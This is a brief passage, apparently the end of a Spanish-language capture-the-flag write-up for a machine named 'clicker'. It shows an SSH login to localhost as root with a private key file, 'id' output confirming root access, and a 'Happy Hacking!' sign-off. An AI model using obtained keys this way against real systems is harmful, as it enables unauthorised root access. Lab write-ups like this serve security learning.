jack@clicker:/tmp$ ssh -i id_rsa root@127.0.0.1
....
root@clicker:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Y ahora sí, ¡ya estaría!

Happy Hacking! 🚀